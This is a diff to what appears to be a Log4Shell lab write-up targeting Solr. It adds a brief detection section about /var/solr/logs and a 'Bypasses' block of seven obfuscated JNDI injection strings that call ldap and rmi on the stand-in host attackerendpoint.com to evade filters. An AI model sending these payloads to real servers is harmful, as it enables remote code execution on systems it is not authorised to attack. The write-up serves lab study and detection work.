@@ -184,5 +184,27 @@ Successfully completed persistence
 
 ## Detection
 
+We know that the logs are stored in `/var/solr/logs`
+
+We can see that our attack log has been stored
+
+<img width="961" height="460" alt="image" src="https://github.com/user-attachments/assets/9b53d0dd-96ea-468f-9c69-4d00189d9915" />
+
+
+#Bypasses
+
+Bypass techniques to bypass the firewall/filters
+
+```
+${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
+${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
+${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
+${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
+${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
+${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
+${${::-j}ndi:rmi://attackerendpoint.com/}
+```
+
+
 
 
